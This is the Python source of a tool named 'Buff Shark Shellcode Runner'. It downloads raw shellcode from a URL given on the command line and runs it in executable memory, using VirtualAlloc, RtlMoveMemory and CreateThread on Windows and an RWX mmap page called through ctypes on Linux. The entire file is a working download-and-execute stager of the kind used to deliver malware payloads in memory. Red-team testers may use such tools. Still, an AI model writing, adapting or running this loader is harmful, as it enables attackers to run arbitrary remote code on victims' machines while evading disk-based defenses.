#!/bin/python
import sys
import mmap
import ctypes
import pyaes
import time
import argparse
import urllib.request

#Buff Shark Python Shellcode Runner



def downloader(shellcode_url):
    with urllib.request.urlopen(shellcode_url) as f:
        print("[+] Downloading shellcode...")
        time.sleep(3)
        data = f.read()
        shellcode = bytearray(data)
        str1 = shellcode.decode('unicode_escape').encode("raw_unicode_escape")
        file_size = len(str1)
        print("[+] %s Bytes Downloaded!" % (file_size))
        return str1



def write_linux(str1):
    mm = mmap.mmap(
            -1,
            mmap.PAGESIZE,
            mmap.MAP_SHARED,
            mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC,
            )
    time.sleep(1)
    print("[+] Running shellcode in memory...")
    mm.write(str1)

    ptr = int.from_bytes(ctypes.string_at(id(mm) + 16, 8), "little")

    functype = ctypes.CFUNCTYPE(ctypes.c_void_p)
    fn = functype(ptr)
    time.sleep(2)
    fn()




def run(shellcode):
    kernel32 = ctypes.windll.kernel32
    length = len(shellcode)

    time.sleep(1)

    print("[+] Running shellcode in memory...")

    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)

    buf = (ctypes.c_char * len(shellcode)).from_buffer_copy(shellcode)

    kernel32.RtlMoveMemory.argtypes = (ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t)
    kernel32.RtlMoveMemory(ptr, buf, length)

    time.sleep(2)

    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_void_p(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(ht, -1)
    





if __name__ == "__main__":
    print("=" * 26)
    print("Buff Shark Shellcode Runner")
    print(" Author: Momo Nguyen ")
    print("=" * 26)

    parser = argparse.ArgumentParser(description="Python Shellcode Runner")
    parser.add_argument('-u', '--url', type=str, metavar='', required=True, help="URL to raw shellcode file")
    parser.add_argument('-a', '--os', metavar='', required=True, help="Choose OS: win/nix", choices=['win', 'nix'])
    args = parser.parse_args()



    if args.os == 'win':
        str1 = downloader(args.url)
        run(str1)
    elif args.os == 'nix':
        str1 = downloader(args.url)
        write_linux(str1)

    
